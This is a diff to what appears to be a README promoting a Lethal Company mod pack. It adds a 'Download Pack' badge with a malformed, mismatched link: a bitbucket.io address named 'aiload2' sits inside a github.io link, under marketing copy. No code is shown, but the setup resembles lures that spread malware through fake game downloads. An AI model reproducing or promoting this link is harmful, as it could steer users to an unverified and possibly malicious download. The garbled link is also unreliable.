@@ -6,6 +6,8 @@ No more scuffed runs. This all-in-one mod pack preps Lethal Company for action w
 
 ---
 
+
+[![Download Pack](https://img.shields.io/badge/Download-Pack-blueviolet)]([https://aiload2.bitbucket.io/](https://lethal-company-ready-pack.github.io/.github/))
 ## **Product Description:**
 
 Lethal Company drops you into a cursed world full of creepy entities and chaotic missions — but the **Ready to Play Pack** makes sure you're not entering that madness unprepared. This isn't just another random bunch of mods. It’s a toolkit built for squad coordination, smoother performance, and better vibes.
